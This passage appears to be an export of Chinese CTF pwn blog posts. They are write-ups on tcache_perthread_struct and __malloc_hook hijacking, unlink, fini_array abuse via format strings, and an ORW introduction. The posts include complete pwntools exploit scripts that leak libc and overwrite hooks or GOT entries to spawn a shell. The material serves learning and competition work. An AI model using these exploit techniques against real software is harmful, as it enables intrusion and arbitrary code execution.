p.sendlineafter('Index:',str(0))\n\nadd(0x78)\n#gdb.attach(p)\ndelete()\nedit(p64(0) * 2) #消除key（一种保护措施），使我们能double free\n#gdb.attach(p)\ndelete()\nshow()\np.recvuntil(b'Content: ')\n#gdb.attach(p)\nheap_base = u64(p.recv(6).ljust(8,b'\\x00')) - 0x260\nlog.success('heap_base==>'+hex(heap_base))\n\nedit(p64(heap_base + 0x10)) #劫持tcache_perthread_struct\nadd(0x78)\nadd(0x78)\n#gdb.attach(p)\n#edit(b'\\x00' * 0x35 + b'\\x07')\nedit(b'\\x00' * 0x23 + b'\\x07') #伪造counts数组，让它误以为0x250的堆块已经free了7个\ndelete()\nshow()\np.recvuntil(b'Content: ')\nmalloc_hook = u64(p.recv(6).ljust(8,b'\\x00')) - 96 - 0x10\nlog.success('malloc_hook==>'+hex(malloc_hook))\nlibc = LibcSearcher('__malloc_hook',malloc_hook) #赛方提供的libc是错误的，正确版本应该是2.27-3ubuntu1.4_amd64，如果不知道，就用LibcSearcher\nlibc_base = malloc_hook - libc.dump('__malloc_hook')\nlog.success('libc_base==>'+hex(libc_base))\nsystem = libc_base + libc.dump('system')\nfree_hook = libc_base + libc.dump('__free_hook')\n\n#gdb.attach(p)\nedit(b'\\x01\\x01' + b'\\xff'*0x3e + p64(free_hook) + p64(heap_base + 0x260)) #伪造counts数组让它以为0x10和0x20各释放了一个堆块，分别往这两个堆块上布置free和存放/bin/sh\\x00的地方\nadd(0x10)\nedit(p64(system)) #free->system\nadd(0x20)\nedit(b'/bin/sh\\x00') #存放/bin/sh\\x00\n\ndelete() #rdi寻址是add(0x20)的地址，相当于system('/bin/sh\\x00')\np.interactive()\n```\n\n# 总结\n利用tcache_perthread_struct的时候需要精确计算各个地址，步步为营，但如果熟练了就知道大概什么个方式了，很快就能写出来了。不过刚学的时候确实会一个头比两个大，**纸上得来终觉浅 绝知此事要躬行**，多动调几次就会好理解很多，**所以说为什么动调是神！**\n","tags":["Pwn","Heap"],"categories":["网络安全"]},{"title":"劫持__malloc_hook","url":"/2024/04/23/劫持_malloc_hook(加入tcache_bins后)/","content":"\n\n\n# 导论\n\n**动调是最好的导师！**\n\n# malloc_hook函数解析\nmalloc_hook是malloc的钩子函数，在执行malloc时，会先检测__malloc_hook的值，如果malloc_hook的值存在，则执行该地址（值里边表现为十六进制，可以成为地址），也就是说，如果我们成功劫持malloc_hook以后并修改它的值为one_gadget，我们就能getshell\n并且在加入tcache之后，不会对大小进行检测，使我们更好利用它\n\n# 利用范围\n**版本:Ubuntu18（加入了tcache，无需伪造size）--Ubuntu20.04**\n因为**22.04删去了几乎所有的钩子函数**，使得劫持hook成为了不可能，所以它的试用范围仅限于20.04之前，在未来应该会销声匿迹\n\n它在学堆之后估计就是我们的老朋友的，我们**常常能在堆题里看见并利用它**，与**free_hook和relloc_hook**简直是三兄弟\n\n# 利用思路\n**修改chunk->fd指向malloc_hook**，然后把malloc_hook申请出来**成为fake_chunk**，再**修改fake_chunk的值为one_gadget**。修改完毕后记得**校准one_gadget**，有可能无法生效，毕竟可能不满足one_gadget的生效条件\n光说fake_chunk可能会很懵，下面来看看实例罢\n\n# 例题（[HNCTF 2022 WEEK4]ez_uaf）\n## checksec\n\n\n![image](https://s2.loli.net/2024/12/03/mZ1RVCjreHkwaYv.png)\n\n堆题是这样的，基本保护全开，但是不打紧\n\n## 源审\n\n\n![image](https://s2.loli.net/2024/12/03/AhdvOecj2z7YDb8.png)\n\n经典菜单题\n\n### add\n```C\nint add()\n{\n  __int64 v1; // rbx\n  int i; // [rsp+0h] [rbp-20h]\n  unsigned int v3; // [rsp+4h] [rbp-1Ch]\n\n  for ( i = 0; i <= 15 && heaplist[i]; ++i )\n    ;\n  if ( i == 16 )\n  {\n    puts(\"Full!\");\n    return 0;\n  }\n  else\n  {\n    puts(\"Size:\");\n    v3 = getnum(); //size\n    if ( v3 > 0x500 )\n    {\n      return puts(\"Invalid!\");\n    }\n    else\n    {\n      heaplist[i] = malloc(0x20uLL); //堆列表，存放结构体\n      if ( !heaplist[i] )\n      {\n        puts(\"Malloc Error!\");\n        exit(1);\n      }\n      v1 = heaplist[i];\n      *(_QWORD *)(v1 + 16) = malloc((int)v3); //给content开辟v3大小，指向content，也就是说，这就是个conteng指针\n      if ( !*(_QWORD *)(heaplist[i] + 16LL) )\n      {\n        puts(\"Malloc Error!\");\n        exit(1);\n      }\n      *(_DWORD *)(heaplist[i] + 24LL) = v3; //fd指针所在位置，位于struct+0x18的位置\n      puts(\"Name: \");\n      if ( !(unsigned int)read(0, (void *)heaplist[i], 0x10uLL) ) //struct的data域存0x10大小的name\n      {\n        puts(\"Something error!\");\n        exit(1);\n      }\n      puts(\"Content:\");\n      if ( !(unsigned int)read(0, *(void **)(heaplist[i] + 16LL), *(int *)(heaplist[i] + 24LL)) )\n      {\n        puts(\"Error!\");\n        exit(1);\n      }\n      *(_DWORD *)(heaplist[i] + 28LL) = 1; //不重要，就是个标识的占位符\n      return puts(\"Done!\");\n    }\n  }\n}\n```\n可以看到会申请两个堆块，一个是**struct结构体的大小**，另一个是**content的堆块**，struct里有**指向content**的指针\n### delete\n\n\n![image](https://s2.loli.net/2024/12/03/Mjsq7P6JEcwOdWp.png)\n\n将add的两个堆块给free，但没有将指针置空，很明显的**UAF**漏洞\n\n### show\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240423210908692-1046484474.png)\n\n![image](https://s2.loli.net/2024/12/03/4rObR5TBYJyHjX8.png)\n\n很正常的打印函数\n\n### edit\n\n\n![image](https://s2.loli.net/2024/12/03/ZAMT97fs6hoDzCi.png)\n\n编辑content\n\n## 思路\n先**申请个0x400的堆块并free掉**，使其**进入unsorted bin**，因为其中只有一个元素，指向自己，会**泄露出main_arena(栈地址)**，在**main_arena-0x10处是malloc_hook**，接收main_arena后就可以泄露出malloc_hook和libc_base，就可以劫持malloc_hook了，接下来使**malloc_hook成为fake_chunk**后往里填one_gadget即可\n\n## 动调过程\n### 泄露libc和malloc_hook\n```Python\ndef add(size,name,content):\n    p.recvuntil(b'Choice:')\n    p.sendline(b'1')\n    p.recvuntil(b'Size:')\n    p.sendline(str(size))\n    p.recvuntil(b'Name:')\n    p.send(name)\n    p.recvuntil(b'Content:')\n    p.send(content)\n\ndef delete(idx):\n    p.recvuntil(b'Choice:')\n    p.sendline(b'2')\n    p.recvuntil(b'idx:')\n    p.sendline(str(idx))\n\ndef show(idx):\n    p.recvuntil(b'Choice:')\n    p.sendline(b'3')\n    p.recvuntil(b'idx:')\n    p.sendline(str(idx))\n\nadd(0x410,'Dusk','Falling')#0\nadd(0x20,'Dawn','Rising')#1\nadd(0x10 ,'Star','Shining')#2\ngdb.attach(p)\ndelete(0) #free大堆块进入unsorted_bin（大于0x410的堆块即进入unsorted_bin）\nshow(0) #泄露main_arena + 96，进而获取malloc_hook和libc_base\n\nmain_arena = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00')) - 96\nlog.success('main_arena==>'+hex(main_arena))\nmalloc_hook = main_arena - 0x10\nlog.success('malloc_hook==>'+hex(malloc_hook))\nlibc_base = malloc_hook - libc.symbols['__malloc_hook']\nlog.success('libc_base==>'+hex(libc_base))\none_gadget = libc_base + 0x10a2fc\nlog.success('one_gadget==>'+hex(one_gadget))\n```\nfree前\n\n\n![image](https://s2.loli.net/2024/12/03/iCXV5EBc4faOZmz.png)\n\nfree后\n\n\n![image](https://s2.loli.net/2024/12/03/Ocz7lJNawP2LhGK.png)\n\n可以看到**unsorted_bin里已经指向main_arena**了，**将0堆块show了即可泄露栈地址**\n\n### 伪造fake_chunk和填one_gadget\n```Python\ndelete(1)\nedit(1,p64(malloc_hook))\nadd(0x10,'change','struct')  #3\nadd(0x20,'change','payload') #4\nedit(4,p64(one_gadget))\n\np.sendlineafter(b'Choice:',b'1')\np.sendlineafter(b'Size:',b'10')\n```\n经过两次free后，我们的堆是这样的\n\n\n![image](https://s2.loli.net/2024/12/03/qIpr7AehXzQZPKw.png)\n\n此时我们**堆块1**的content地址是**0x55abadf3e720**，**通过edit我们可以将它的fd指针修改为malloc_hook**\nedit前\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240423212806621-106904059.png)\n\n![image](https://s2.loli.net/2024/12/03/mZ7fskPIyOYgeEA.png)\n\nedit后的链表和堆块1content的内容\n![image](https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240423212910925-698542447.png)\n\n![image](https://s2.loli.net/2024/12/03/bMidPjE31C6ZXsH.png)\n\n我们可以看到，堆块1的content的fd指针已经被修改成了malloc_hook，成了实际size为0x20的fake_chunk，那么我们把它申请出来就好。\n我们先申请堆块3,链表就变成了这样\n\n![image](https://s2.loli.net/2024/12/03/4KdiJWcbYSyB8oE.png)\n\n至于为什么**只申请出了一个堆块**，是因为我们**申请的content的大小只有0x10（显示0x21）字节**。\n现在就是申请堆块4把malloc_hook变成fake_chunk。因为两个malloc都是申请size为0x20，刚好**使content为fake_chunk，使我们的edit对它有写的权限**\n先看malloc_hook此时的值，里边的玩意估摸着是我add堆块4的时候弄进去的\n\n![image](https://s2.loli.net/2024/12/03/Hf7AhSsWzYekL9g.png)\n\nOK，我们现在来edit它\n\n\n![image](https://s2.loli.net/2024/12/03/uPAvyphXd1LK2al.png)\n\n\n\n![image](G:\\website\\new_reimu\\reimu-template\\source\\_data\\malloc\\3326078-20240423214607464-1341744778.png)\n\n和我们的one_gadget一样，我们只需再一次执行malloc就可以getshell了，注意多次调整one_gadget，满足其条件。因为我的本地环境和远端不一样所以没通，其实路子就是这样了\n\n# 感言\n我上网搜的时候感觉看的都是fast_bin的版本，没有怎么搜到tcache的，然后就自己摸索去了，并写出了此篇blog记录tcache的攻击方法。只能说，**动调真的是学pwn最重要的东西，是最好的老师！**\n","tags":["Pwn","Heap"],"categories":["网络安全"]},{"title":"格式化字符串漏洞利用fini_array及其拓展应用","url":"/2024/04/17/格式化字符串漏洞利用fini_array及其拓展/","content":"\n\n\n# 导言\n\n这类题型还是我复现CISCN_2019_西南的PWN1的时候遇见的，算是涨知识了\n\n# 前置知识\n我们都知道，在程序中最先调用的不是```main```,也不是```__libc_start_main```，而是```_start```，我们来看一下再x86下的```_start```\n```\n.text:08048420                     public _start\n.text:08048420     _start          proc near               ; DATA XREF: .LOAD:08048018↑o\n.text:08048420 000                 xor     ebp, ebp        ; Logical Exclusive OR\n.text:08048422 000                 pop     esi\n.text:08048423 -04                 mov     ecx, esp\n.text:08048425 -04                 and     esp, 0FFFFFFF0h ; Logical AND\n.text:08048428 -04                 push    eax\n.text:08048429 000                 push    esp             ; stack_end\n.text:0804842A 004                 push    edx             ; rtld_fini\n.text:0804842B 008                 push    offset __libc_csu_fini ; fini\n.text:08048430 00C                 push    offset __libc_csu_init ; init\n.text:08048435 010                 push    ecx             ; ubp_av\n.text:08048436 014                 push    esi             ; argc\n.text:08048437 018                 push    offset main     ; main\n.text:0804843C 01C                 call    ___libc_start_main ; Call Procedure\n.text:08048441 01C                 hlt                     ; Halt\n.text:08048441     _start          endp\n.text:08048441\n```\n我们可以看到，在_start结束的时候会调用```__libc_start_main```，而我们再看__libc_start_main的函数\n```\n// attributes: thunk\nint __cdecl __libc_start_main(\n        int (__cdecl *main)(int, char **, char **),\n        int argc,\n        char **ubp_av,\n        void (*init)(void),\n        void (*fini)(void),\n        void (*rtld_fini)(void),\n        void *stack_end)\n{\n  return _libc_start_main(main, argc, ubp_av, init, fini, rtld_fini, stack_end);\n```\n可以看到，包含有```main,init,fini```，既然传进去了这些参数，那必然有他们的用处,main和init就不用多说了，fini是做什么的呢？我们得跟进看一看。\n\n\n![image](https://s2.loli.net/2024/12/03/adr1UKXLCBljEHn.png)\n\n可以看到，**__libc_start_main的返回地址就是__libc_csu_fini**，证明它是在__libc_start_main在结束后就会调用__libc_csu_fini，要是我们能对它进行一些修改，那说不定就能做一些“坏事”。我们来看看跟它相关的东西。\n我们可以在fini_array段找到与__libc_csu_fini相关的东西，是数组\n\n```\n.fini_array:0804979C     ; ELF Termination Function Table\n.fini_array:0804979C     ; ===========================================================================\n.fini_array:0804979C\n.fini_array:0804979C     ; Segment type: Pure data\n.fini_array:0804979C     ; Segment permissions: Read/Write\n.fini_array:0804979C     _fini_array     segment dword public 'DATA' use32\n.fini_array:0804979C                     assume cs:_fini_array\n.fini_array:0804979C                     ;org 804979Ch\n.fini_array:0804979C     __do_global_dtors_aux_fini_array_entry dd offset __do_global_dtors_aux\n.fini_array:0804979C                                             ; DATA XREF: __libc_csu_init+16↑o\n.fini_array:0804979C     _fini_array     ends                    ; Alternative name is '__init_array_end'\n.fini_array:0804979C\n```\n在这个数组里存放着一些函数的指针，并且**在进入__do_global_dtors_aux这个函数中会遍历并且调用各个指针，__do_global_dtors_aux_fini_array_entry是一个在程序结束时需要调用的函数的名称，它的地址偏移量在这里被存储**，也就是说，如果我们能**把__do_global_dtors_aux_fini_array_entry指向的地址变为main函数或者其它的地址，就可以进行一些非法操作**\n这就是fini_array在x86下格式化字符串的基本应用\n不过需要注意的是，```_init_array的下标是从小到大开始执行，而_fini_array的下标是从大到小开始执行```这对我们构造payload起到非常关键的作用\n\n# 例题 [CISCN 2019西南]PWN1\n## checksec\n\n\n![image](https://s2.loli.net/2024/12/03/YfbIEmONDhwu6S3.png)\n\n基本没什么保护，看起来很简单的样子\n\n## 代码审计\n\n\n![image](https://s2.loli.net/2024/12/03/47zo3YjxFfDmM5u.png)\n\n\n\n![image](https://s2.loli.net/2024/12/03/EW3xzoIepG2CHOZ.png)\n\n主函数有格式化字符串漏洞，而且看起来有后门给我们跳转的样子。但不可能，**scanf限宽，只让我们输入64个字符**，不够我们进行栈溢出，并且也只能执行一次格式化字符串漏洞，看起来无计可施了对不对？这个时候就该使用我们压箱底的fini_array了\n因为__libc_start_main的函数返回地址是__libc_csu_fini，而fini_array与它相关联，我们只要把fini_array里的内容给修改了就好。\n让我们看看最开始**__do_global_dtors_aux_fini_array_entry指向谁**\n\n![image](https://s2.loli.net/2024/12/03/4yFuComHaG2rOfl.png)\n\n就跟我在上面写的一样，是__do_global_dtors_aux，那么我们只要把它修改成main函数的地址，就可以再次执行main函数，我们先修改一下\n\n```Python\nfini_array = 0x804979C\nmain_addr = 0x8048534\npayload = p32(fini_array + 2) + p32(fini_array)\npayload += b'%' + str(0x0804 - 0x08).encode() + b'c%4$hn' #减去0x08是因为前边已经输入了八字节\npayload += b'%' + str(0x8534 - 0x0804).encode() + b'c%5$hn'\np.recvuntil('name?\\n')\np.sendline(payload)\n```\nOK，现在我们再看看\n\n\n![image](https://s2.loli.net/2024/12/03/tmCjILAOVx7ZyBz.png)\n\n可以看到已经成功修改了，因为在这里边会**将指针遍历并调用**，所以我们会再次执行main函数\n至于为什么是倒序写fini_array，就跟我上面说的fini_array的下标是从大到小开始执行的，所以越往后越先执行\n既然我们能再一次调用main函数，那么我们就可以在第一次main函数执行的时候把printf@got指向system@plt，在第二次main函数执行时，就可以直接往scanf里传```/bin/sh\\x00```，从而达到getshell的效果，跟后门一样。\n\n## Payload\n``` Python\nfrom pwn import *\ncontext(arch='i386', os='linux', log_level='debug')\ncontext.terminal = ['tmux', 'splitw', '-h']\n\np = process('./xinan_PWN1')\n#p = remote('node5.anna.nssctf.cn',28906)\nelf = ELF('./xinan_PWN1')\n\nfini_array = 0x804979C\nprintf_got = 0x804989C#elf.got['printf']\nsystem_plt = 0x80483D0#elf.plt['system']\nmain_addr = 0x8048534#elf.symbols['main']\n\npayload = p32(fini_array+2) + p32(printf_got + 2) + p32(printf_got) + p32(fini_array)\npayload += b'%' + str(0x0804 - 0x10).encode() + b'c%4$hn'\npayload += b'%5$hn'\npayload += b'%' + str(0x83D0 - 0x0804).encode() + b'c%6$hn'\npayload += b'%' + str(0x8534 - 0x83D0).encode() + b'c%7$hn'\ngdb.attach(p)\np.recvuntil('name?\\n')\np.sendline(payload)\n\np.recvuntil('name?\\n')\np.sendline(b'/bin/sh\\x00')\np.interactive()\n```\n\n# 后日谈\n这玩意在x64的情况其实跟x86差不多（特指格式化字符串），就是多了寄存器传参，步骤会变得更加繁琐一点。这个技巧我觉得更适用于**无计可施的时候**，在其它攻击方法能用的时候，都不会挑这个来用，只有想不到别的办法的时候，它的价值才体现出来\n当然，fini_array的作用远不止于此，它还可以和更多的攻击方式利用起来\n比如\n## Loop链\n```Python\nfini_array[0] = __libc_csu_fini\nfini_array[1] = target_addr\n```\n因为是从大到小开始执行，所以它的执行流程是这样的\n```_start-->__libc_start_main-->libc_csu_init-->main-->libc_csu_fini-->target_addr-->libc_csu_fini-->target_addr-->...```\n**只要你不改变fini_array的值，我们就可以无限次执行下去**，任何的one_byte漏洞都会被无限放大，实现任意地址写\n\n## ROP链攻击\n**这个常常与栈迁移联系在一起**\n当栈空间不足时，我们可以把栈迁移到fini_array里去，先构造Loop链使它无限循环，然后**往fini_array * 0x10后布置ROP链**\n当ROP链布置完后，要想跳出循环\n```\nfini_array[0]修改为leave_ret\nfini_array[1]修改为ret\n```\n修改完后就能getshell了\n\n至于为什么没有例题...是因为我还没有遇到，如果有我后续会补上来的","tags":["Stack","Pwn"],"categories":["网络安全"]},{"title":"unlink","url":"/2024/04/06/unlink(smallbins)/","content":"\n\n\n是我的错觉么，总觉得unlink比UAF好懂好多...也有可能是我觉得做题模板比较好理解一点，真要深入的话我感觉一个头会比两个大emmmm\n\n# 原理及其条件\n## 原理\nunlink顾名思义，脱链，把一个空闲的chunk从unsorted bin里取出来，与物理相邻的chunk合成一个一个大堆块（分“前合”，“后合”’）。这里用图来解释会更清晰一些\n原本的堆块结构是这样的，双向链表\n```\n\tFD = P->fd\n\tBK = P->bk\n```\n\n\n![image](https://s2.loli.net/2024/12/03/ZxITifEDAvdHmkw.png)\n\n在unlink经过一系列操作之后成了这样\n\n```\n\tFD->bk = BK\n\tBK->fd = FD\n```\n\n\n![image](https://s2.loli.net/2024/12/03/zJP2XiD64my9qc7.png)\n\n我们可以很清楚的看到，BK->fd不再指向p->prev_size而是FD->prev_size，而FD-bk同理，指向了BK->prev_size，就把P给脱了出来，**等待下一个被free的与它物理相邻的堆块，与其合并成新的堆块**。比如P和FD都被free了，那么P和FD就会合成为新的堆块，chunk头就是P的首地址，而如果是BK和P合并的话，chunk头就是BK的首地址，所以**前合与后合是不一样的**\n那么我们要是可以**伪造fd和bk弄出了fake_chunk**，是不是就可以**进行任意地址读写**了？\n\n## 条件\n想要利用这个漏洞，那么你就必须拥有修改被free掉的堆块的权限，即**UAF漏洞**\n\n# 关键源码\n\nunlink的源码其实很长，但我们需要动用的部分其实很少，我就把那部分代码截出来进行解读\n```C\n#define unlink(BK,P,FD){\n\tFD = P->fd;\n\tBK = P-bk;\n\tif(__builtin_expect(FD->bk != P || BK-> != P,0))\n\t\tmalloc_printerr(check_action,\"corrupted doubnle-linked list\",P,AV);\n\t\t//说人话就是如果FD->bk指向的不是P或BK->fd指向的不是P，那么就会报错，不允许进行这样的修改\n\tFD->bk = BK;\n\tBK->fd = FD;\n}\n```\n所以我们要想**伪造fake_chunk**,那么我们就要满足这样的表达式\n```\nP->fd->bk == P <=> *(P->fd + 0x18) == P\np->bk->fd == P <=> *(p->bk + 0x10) == P\n```\n那么我们伪造的fd和bk就是\n```\nP->fd = P - 0x18\nP->bk = P - 0x10\n```\n其**最终效果就是往P里写入（P-0x18）的值**\n\n# 例题(stkof)\n## 审视源码\nmain函数，可以看到是去符号表的，通过1,2,3,4来执行相应函数，类似于menu\n\n\n![image](https://s2.loli.net/2024/12/03/3QceFKBY1P68yZl.png)\n\n首先看寻找下```malloc```在哪里，经查询，当```v3 == 1```时，该函数就是malloc\n\n\n![image](https://s2.loli.net/2024/12/03/8FKqdvxcVNzB1pJ.png)\n\n有了malloc，后面的函数就更好对应了，那我们来看看```v3 == 2```是什么\n\n\n![image](https://s2.loli.net/2024/12/03/h2cYwWZdBGlTi4O.png)\n\n可以看到，有两个输入，最开始会**查询数组s中的v2存不存在**，不存在就Fail，所以可以看做是**index**，而第二个输入比较复杂，先是把s字符串转为整形赋给n，ptr取s[v2]的内容，在for循环里逐字节对应，那么我们可以得到```n为size```，而```ptr为content```，那么这一整个函数就可以说是```edit```\n再看看```v3 == 3```，很明显是个free\n\n![image](G:\\website\\new_reimu\\reimu-template\\source\\_data\\unlink\\3326078-20240406120910537-1401599609.png)\n\n其实只要有这三个函数就足够了，剩下的那个函数就是个checkin，看看你写入没有，非必要就不展示了\n\n## Payload\n可能是我ubuntu22.04版本有点高，本地调不通，所以我本来想很详细的写gdb调试过程的，但是却因为本地调不成功而远端可打，迫于无奈只能先把payload整个放出来，然后逐步解释\n```Python\nfrom pwn import *\n\ncontext(arch='amd64', os='linux', log_level='debug')\ncontext.terminal = ['tmux', 'splitw', '-h']\n#p = process('./stkof')\np = remote('node5.buuoj.cn',25670)\nelf = ELF('./stkof')\n\ndef malloc(size):\n    p.sendline('1')\n    p.sendline(str(size))\n\ndef edit(index,size,content):\n    p.sendline('2')\n    p.sendline(str(index))\n    p.sendline(str(size))\n    p.send(content)\n\ndef free(index):\n    p.sendline('3')\n    p.sendline(str(index))\n\nP = 0x602150\nFD = P - 0x18\nBK = P - 0x10\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\nfree_got = elf.got['free']\natoi_got = elf.got['atoi']\n\nmalloc(0x30)\nmalloc(0x30)\nmalloc(0x80)\nmalloc(0x80)\n\n#gdb.attach(p)\n\npayload = p64(0) + p64(0x31)\npayload += p64(FD) + p64(BK)\npayload += b'a' * 0x10\npayload += p64(0x30) + p64(0x90)\n#gdb.attach(p)\nedit(2,0x40,payload)\n#gdb.attach(p)\nfree(3)\n#gdb.attach(p)\n\npayload_change = p64(0)\npayload_change += p64(atoi_got)\npayload_change += p64(puts_got)\npayload_change += p64(free_got)\n\nedit(2,len(payload_change),payload_change)\n\npayload_leak = p64(puts_plt)\nedit(2,len(payload_leak),payload_leak)\nfree(1)\n\nputs_real_addr = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))\nlog.success('puts_real_addr:'+hex(puts_real_addr))\n\nlibc_base = puts_real_addr - 0x6f690\nlog.success('libc_base:'+hex(libc_base))\n\nsystem_addr = libc_base + 0x45390\nlog.success('system_addr:'+hex(system_addr))\n\nedit(2,0x08,p64(system_addr))\n\nmalloc(0x20)\npayload = b'/bin/sh\\x00'\nedit(4,len(payload),payload)\nfree(4)\np.interactive()\n```\n\n## 逐步讲解\n### 伪造fake_chunk\n首先是很常规的步骤，创建四个堆块，然后根据unlink原理伪造fd和bk，创造出fake_chunk\n```Python\nmalloc(0x30)\nmalloc(0x30)\nmalloc(0x80)\nmalloc(0x80)\n\npayload = p64(0) + p64(0x31) \npayload += p64(FD) + p64(BK) #跟选取的堆块有关\npayload += b'a' * 0x10 #因为我开辟的堆块大小为0x30，为了覆盖到下一个堆块头，得先把这0x30填充完\npayload += p64(0x30) + p64(0x90)\n\nedit(2,0x40,payload)\nfree(3)\n```\n我们一次来看edit之前，edit和free后的状况\n### edit前\n\n\n![image](https://s2.loli.net/2024/12/03/kSTCQgKEcuyqRls.png)\n\n首先我们先排除三个堆块，分别为系统创造的size为0x290,0x1000,0x410（其实都比真实开辟的地址大0x10)，其余的才是**我们创造的堆块**。\n我们可以看到最初的堆块构造\n\n### edit\n\n\n![image](https://s2.loli.net/2024/12/03/gadSqX2G9M4RYVp.png)\n\n现在我们已经把payload的内容写进去了，fd和bk也都伪造好了，不过在伪造fd,bk之前，得先确定堆块的位置，先来看看如何根据堆块的位置进行伪造fd,bk指针\n\n\n![image](https://s2.loli.net/2024/12/03/sUANelVQynpHudc.png)\n\n**0x602140是数组s的首地址**，也是我们堆所在的地方，我们可以很清楚的看到，因为我选取的是```堆块2```，对应的地址是```0x602150-->0x1ed4700```，所以我的```P == 0x612150```，那么fd和bk也就应运而生\n\n### free\n从这里开始我的gdb就开始失败了，为了连贯我还是把它放出来\n\n\n![image](https://s2.loli.net/2024/12/03/mM9vytVlYx2kAcC.png)\n\n按照正常情况，我最开始的**0x31应该会被修改成0xc1**，而**bk和fd也会被解析为真实地址**，但是不知为何没有，应该是ubuntu版本问题。\n如果正常运行的话，堆会变成这样\n\n\n![image](https://s2.loli.net/2024/12/03/hm4kt6OQIypg7Jq.png)\n\n那么我们现在就可以进行任意地址写了\nPS:由于堆块2和3已经合并了，所以**这里的chunk3实际是我开辟的第四个堆块**\n\n## 修改chunk\n### 思路\n从这里开始可能就比较意识流了，我会尽量进行详细解释，让大家看懂\n```Python\npayload_change = p64(0) #0x602138\npayload_change += p64(atoi_got) #0x602140\npayload_change += p64(puts_got) #0x602148\npayload_change += p64(free_got) #0x602150\n\nedit(2,len(payload_change),payload_change) #相当于从0x602138开始写入地址\n\npayload_leak = p64(puts_plt)\nedit(2,len(payload_leak),payload_leak) #泄露任意你想要的地址\nfree(1) #puts对应所在堆块\n\nputs_real_addr = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))\nlog.success('puts_real_addr:'+hex(puts_real_addr))\n```\n**我们要进行任意地址写，就必须从0x602138入手，也就是我们的堆块2入手**，我们把got表填写进chunk之中，通过改写got表来实现任意操作。因为我们的程序中不存在system，所以我们得先泄露出libc_base才行，**把free改成puts即可通过free任意地址打印出对应函数的真实地址**\n### first_edit\n\n\n![image](https://s2.loli.net/2024/12/03/KQDGUZYHClXETAi.png)\n\n### second_edit\n\n\n![image](https://s2.loli.net/2024/12/03/r7yj8ciZPL6SHbk.png)\n\n### 泄露\n我们已经**把free_got指向了puts**，那么我们**free任意堆块都相当于puts出了它的真实地址**，只需要接收地址即可，因为2我泄露的是puts函数，puts函数是在堆块1内，所以我是free(1)\n\n### 收尾\n```Python\nlibc_base = puts_real_addr - 0x6f690\nlog.success('libc_base:'+hex(libc_base))\n\nsystem_addr = libc_base + 0x45390\nlog.success('system_addr:'+hex(system_addr))\n\nedit(2,0x08,p64(system_addr))\n\nmalloc(0x20)\npayload = b'/bin/sh\\x00'\nedit(4,len(payload),payload)\nfree(4)\np.interactive()\n```\n**把free再次改成system**，然后往空堆块里塞```/bin/sh```再free即可\n\n## 注意\n当时写这个blog的时候是Ubuntu22.04且还不熟悉bins的结构和tcache的异或，所以前边写的有些怪，~~时间太长懒得改了~~。这个适用的是类似small_bins和large_bins，不适用于tcache","tags":["Pwn","Heap"],"categories":["网络安全"]},{"title":"ORW","url":"/2024/03/29/orw/","content":"\n\n\n# ORW\n\n## 引入\n在现今的CTF赛事中，越来越多的题目启动了沙箱，往往是禁用了```execve```函数，使我们没办法直接通过```system(/bin/sh\\x00)```来getshell，这个时候就到了ORW大显身手的时刻。\nORW分别是**open,read,write**的首字母缩写，也正是要利用这三个函数来**读出flag文件**\n## 原理\n在禁用execve的情况下，我们需要经过以下操作来得到flag值\n\n    open开flag文件\n    read出flag的内容\n    write显示flag的值\n## 攻击方式\n在知晓大概的流程之后，就得设置寄存器的参数了，我们得知道各个函数对应的参数分别代表什么意思\n```open(file,oflag)```,```read(fd,buf,n_bytes)```和```write(fd,buf,n_bytes)```\n### open\nfile就是我们要读取的**文件名**，CTF中一般为flag，或者flag.txt。\n而oflag则是我们**以何种方式打开文件**，如只读，只写，可读可写。一般来说我们都设置```oflag=0```，以默认方式打开文件，一般来说都是**只读**，我们并不需要对flag进行其它操作，所以只读的权限就够了\n### read和write\n这两个是大同小异的。**fd是文件描述符**，通过设置它来决定函数的操作。**在大多数时候，我们常常设置read的fd为0，代表标准输入**，但在ORW中，我们需要**设置read的fd为3，表示从文件中读取**，buf就是我们读取出的flag值存放的地址，n_bytes就是能输入多少字节的数据。write的fd还是如常，依旧为1.\n### 效果\n源码如图\n\n![ 2024-05-27 173409.png](https://s2.loli.net/2024/05/27/6YzseGqjvZT4lSw.png)\n\nLinux下的执行效果\n\n![ 2024-05-27 173541.png](https://s2.loli.net/2024/05/27/2wD5ThUeRJazsv6.png)\n![ 2024-05-27 173558.png](https://s2.loli.net/2024/05/27/YQr14TvsuySxRHW.png)\n![ 2024-05-27 173620.png](https://s2.loli.net/2024/05/27/92tvAMLucdkeKQI.png)\n\n![ 2024-05-27 173639.png](https://s2.loli.net/2024/05/27/ILEAlRiTxdH96JZ.png)\n\n当然，我们构建源码是非常简单的，但是题目里就不一定了，根据题目的不同ORW里也有一些变种\n\n## 栈上的ORW\n### ROP链的ORW\n这是我们最常见的ORW了，通过ROPgadget在ELF文件、libc.so.6中寻找我们的gadget。在这种orw中，我们需要用的寄存器有```rax,rdi,rdx,rsi```。rax的作用不必多说，系统调用号。而**rdi在这open中存储file的地址，在read和write中储存fd；rdx储存的是输入\\输出的字节数大小；rsi在open中储存的是oflag，在read和write中储存的是buf**\n\n    open(rdi-->file_addr,rsi-->oflag)\n    read/write(rdi-->fd,rsi-->buf,rdx-->s_nbytes)\n嫌这样记太麻烦的话，就只需要记住它的参数传递符合x64的**函数调用约定**\n#### 例题 [HGAME 2023 week1]orw\n根据题目一眼看出就是ORW，我们先看看函数\n\n![ 2024-05-27 180227.png](https://s2.loli.net/2024/05/27/abewZpHnrISCoWV.png)\n![ 2024-05-27 180237.png](https://s2.loli.net/2024/05/27/DoSI9RACY2mWegf.png)\n\n![ 2024-05-27 184023.png](https://s2.loli.net/2024/05/27/OfY3oQnr2tMElT9.png)\n\n![ 2024-05-27 180423.png](https://s2.loli.net/2024/05/27/7QSnkXZL3INbMw8.png)\n\n检验过后确实是ORW，禁用了execve，read函数里只够0x28个字节，明显是不够的，**需要迁移**。\n##### 